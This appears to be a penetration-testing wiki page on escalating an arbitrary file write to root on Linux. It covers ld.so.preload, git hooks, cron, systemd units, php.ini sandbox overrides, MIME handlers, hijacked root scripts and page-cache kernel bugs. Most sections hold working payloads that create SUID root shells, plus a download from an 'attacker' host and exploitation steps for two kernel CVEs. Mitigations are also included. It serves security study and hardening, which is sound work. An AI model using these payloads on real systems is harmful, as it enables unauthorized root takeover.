# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` is a system-wide list of shared objects that the dynamic linker loads before other shared objects. Secure-execution mode applies additional restrictions to preloading, so a library path such as `/tmp/pe.so` is not a universal SUID-binary technique.\
If you can create or modify it, a process that loads the file will load the listed library before its other shared objects, allowing code execution in that process's context.<sup>[[12]](#references)</sup>

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** are executable scripts run for events in a repository, including commit and merge operations. If a **privileged script or user** performs those actions and an attacker can **write in the `.git` folder**, the hook can be used for **privilege escalation**.<sup>[[13]](#references)</sup>

For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Cron & Time files

If you can **write cron-related files that root executes**, you can usually get code execution the next time the job runs. Interesting targets include:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root's own crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

Quick checks:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typical abuse paths:

- **Append a new root cron job** to `/etc/crontab` or a file in `/etc/cron.d/`
- **Replace a script** already executed by `run-parts`
- **Backdoor an existing timer target** by modifying the script or binary it launches

Minimal cron payload example:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

If you can only write inside a cron directory used by `run-parts`, drop an executable file there instead:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` usually ignores filenames containing dots, so prefer names like `backup` instead of `backup.sh`.<sup>[[15]](#references)</sup>
- Some systems use `systemd` timers instead of classic cron, but the abuse idea is the same: **modify what root will execute later**.<sup>[[20]](#references)</sup>

### Service & Socket files

If you can write **`systemd` unit files** or files referenced by them, you may be able to get code execution as root by reloading and restarting the unit, or by waiting for the service/socket activation path to trigger.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interesting targets include:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Quick checks:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Common abuse paths:

- **Overwrite `ExecStart=`** in a root-owned service unit you can modify
- **Add a drop-in override** with a malicious `ExecStart=` and clear the old one first
- **Backdoor the script/binary** already referenced by the unit
- **Hijack a socket-activated service** by modifying the corresponding `.service` file that starts when the socket receives a connection

Example malicious override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typical activation flow:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.<sup>[[17]](#references)</sup>

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Some custom daemons validate user-supplied PHP by running `php` with a **restricted `php.ini`** (for example, `disable_functions=exec,system,...`). If the sandboxed code still has **any write primitive** (like `file_put_contents`) and you can reach the **exact `php.ini` path** used by the daemon, you can **overwrite that config** to lift restrictions and then submit a second payload that runs with elevated privileges.<sup>[[2]](#references)</sup>

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimal example (replace the path used by the daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

`binfmt_misc` exposes registrations under `/proc/sys/fs/binfmt_misc`; each registration associates a file-type pattern with an interpreter. The privilege impact depends on who can change the registration and which process later executes the matching file, so verify those requirements before treating it as a privilege-escalation path.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Desktop environments use MIME associations and desktop entries to choose an application for URI schemes; an attacker who can write the relevant per-user configuration and desktop-entry directories can redirect those schemes to a launcher they control. By modifying the `$HOME/.config/mimeapps.list` file to point HTTP and HTTPS URL handlers to a malicious file (for example, `x-scheme-handler/http=evil.desktop` and `x-scheme-handler/https=evil.desktop`), a user click can invoke that desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root executing user-writable scripts/binaries

If a privileged workflow runs something like `/bin/sh /home/username/.../script` (or any binary inside a directory owned by an unprivileged user), you can hijack it:<sup>[[1]](#references)</sup>

- **Detect the execution:** monitor processes with pspy to catch root invoking user-controlled paths.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Confirm writeability:** ensure both the target file and its directory are owned/writable by your user.
- **Hijack the target:** backup the original binary/script and drop a payload that creates a SUID shell (or any other root action), then restore permissions:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.

### Page-cache-only file modification of privileged binaries

Some kernel bugs don't modify the file **on disk**. Instead, they let you modify only the **page cache copy** of a readable file. If you can target a **setuid** or otherwise **root-executed** binary, the next execution may run attacker-controlled bytes from memory and escalate privileges even though the file hash on disk is unchanged.<sup>[[3]](#references)[[4]](#references)</sup>

This is useful to think about as a **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk stays clean**: the inode and on-disk bytes do not change
- **Memory is dirty**: processes reading/executing the cached page get the attacker-modified content
- **Effect is temporary**: the change disappears after reboot or cache eviction

This primitive sits between classic **arbitrary file write** and older **page-cache abuse** bugs such as Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW relied on a race
- Dirty Pipe had write-position constraints
- A page-cache-only primitive can be more reliable if the vulnerable path gives direct writes into cached file-backed pages

#### Generic privesc flow

1. Get a kernel primitive that can write into **file-backed page cache pages**
2. Use it against a **readable privileged binary** or another root-executed file
3. Trigger execution **before** the page is evicted from cache
4. Get code execution as root while the on-disk file still looks unmodified

Typical high-value targets:

- **setuid-root** binaries
- Helpers launched by **root services**
- Binaries commonly executed from **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) is a good example of this class. The vulnerable path was in the Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` can move references to page-cache pages from a readable file into the crypto TX scatterlist
- the in-place `algif_aead` decrypt path reused source and destination buffers
- `authencesn` then wrote into the destination tag region
- when that region still referenced spliced file-backed pages, the write landed in the **page cache of the target file**

So the interesting technique is not the CVE itself, but the pattern:

- **feed file-backed cache pages into a kernel subsystem**
- make the subsystem **treat them as writable output**
- trigger a small controlled overwrite in memory

The public PoC used repeated **4-byte writes** to patch `/usr/bin/su` in memory and then executed it.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) shows another variant of the same **page-cache-only write-to-root** pattern, but this time the sink is **IPsec ESP decrypt** instead of `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

The important technique is the **metadata-laundering step**:

- `splice()` places a **read-only file-backed page-cache page** into an ESP-in-UDP packet
- the original DirtyFrag mitigation tagged that skb with `SKBFL_SHARED_FRAG` so `esp_input()` would **copy before decrypting**
- netfilter `TEE` duplicates the packet through `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- the clone keeps the **same physical page-cache reference** but loses `SKBFL_SHARED_FRAG`
- `esp_input()` then treats the clone as safe and runs **in-place `cbc(aes)` decrypt** over the file-backed page

So the reviewer lesson is broader than the CVE: if a mitigation depends on **skb/page metadata** to decide whether an operation must copy first, any **clone/copy path that preserves the backing page but drops the metadata** can silently re-open the write primitive.

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` to obtain **`CAP_NET_ADMIN` inside a private network namespace**
2. bring loopback up and install a **netfilter `TEE` rule** in `mangle/OUTPUT`
3. install **XFRM ESP transport SAs** via `NETLINK_XFRM`
4. encode each target 4-byte word in the SA `seq_hi` field (DirtyFrag's word-selection trick)
5. send the spliced ESP-in-UDP packet so the **TEE clone** reaches `esp_input()` and decrypts **in place**
6. repeat until the page-cache copy of `/usr/bin/su` or another privileged executable contains attacker-controlled code

Operationally, the impact is the same as the `AF_ALG` example: the file on disk stays clean, but `execve()` consumes the **mutated page-cache bytes** and yields root.<sup>[[8]](#references)[[9]](#references)</sup>

Useful exposure checks for this variant:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Short-term attack-surface reduction is also path-specific here: upgrading to a kernel carrying `48f6a5356a33` fixes the clone path, while blocking `xt_TEE` autoload removes the **flag-laundering step** and blocking `esp4` / `esp6` removes the **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure and hunting

If you suspect this class of bug, don't rely only on disk integrity checks. Also verify:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

The configuration values below distinguish a loadable interface from one built into the kernel; the crypto build rules map `CONFIG_CRYPTO_USER_API_AEAD` to `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` may be loadable/unloadable as a module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: the interface is built into the kernel
- setuid binaries are good targets because a page-cache-only patch can be enough to turn a local foothold into root

#### Attack-surface reduction for the `algif_aead` path

If the vulnerable interface is provided by a loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

If it is compiled into the kernel, some disclosures reported blocking the init path with:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

This kind of mitigation is worth remembering for other kernel LPEs too: if exploitation depends on a specific optional interface, disabling or blacklisting that interface can break the exploit path even before a full kernel upgrade is available.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)

{{#include ../../banners/hacktricks-training.md}}
